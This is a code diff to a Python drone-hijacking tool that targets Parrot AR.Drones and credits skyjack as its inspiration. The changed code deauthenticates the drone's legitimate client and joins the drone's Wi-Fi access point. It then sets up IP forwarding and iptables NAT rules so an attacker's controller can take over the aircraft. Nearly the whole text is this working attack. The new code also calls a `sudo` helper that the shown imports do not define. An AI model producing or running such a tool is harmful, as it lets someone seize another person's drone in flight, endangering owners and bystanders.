@@ -1,15 +1,14 @@
-#! /usr/bin/env python3
 #
 # Parrot AR.Drone hacking tool
 # Inspired from https://github.com/samyk/skyjack/
 #
 
-from predatordrone.wifi import WifiManager, AccessPoint, Client
-from predatordrone.external_exec import do
-from predatordrone.menu import Menu
 from multiprocessing import Process
-import predatordrone.disp as disp
-import re
+
+from .wifi import WifiManager, AccessPoint, Client
+from .ext_exec import do
+from .menu import Menu
+from . import disp
 
 
 
@@ -111,25 +110,31 @@ class ParrotHacker:
         self.wlan.connect_access_point(self.ap)
 
         disp.info("Acquiring IP from drone")
-        ip_ok = self.wlan.acquire_ip()
+        ip_ok = self.wlan.acquire_IP()
 
         if ip_ok:
-            disp.info("Taking drone control")
-            try:
-                do("cd", controljs_dir, ';', nodejs, controljs, force_output=True)
-            except KeyboardInterrupt:
-                pass
             disp.info("Well done! You've hijacked the Parrot drone! :)")
+
+            do("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
+            disp.debug("IP forwarding enabled")
+
+            sudo("iptables -t nat -F")
+            sudo("iptables -t nat -A PREROUTING -d 172.20.1.10",
+                    "-j DNAT --to 192.168.1.1")
+            sudo("iptables -t nat -A POSTROUTING -o", self.wlan.card.dev,
+                    "-j SNAT --to", self.wlan.get_IP())
+            disp.debug("NAT enabled")
+
+            disp.info("You can launch on 172.20.1.1 using:")
+            disp.info("  export DEFAULT_DRONE_IP=172.20.1.10")
+            disp.info("  node app.js")
 
 
     def disconnect_and_control(self, client):
         """ Disconnects a client then take control. """
         # Disconnect client
-        disp.info("Disconnecting client", client, "in a separated thread")
-        deauth_process = Process(
-                target = self.mon.deauth_client,
-                args   = (client, self.ap, True, ))
-        deauth_process.start()
+        disp.info("Disconnecting client", client, "from AP", self.ap)
+        self.mon.deauth_client(client, self.ap)
 
         # Take control
         self.take_control()
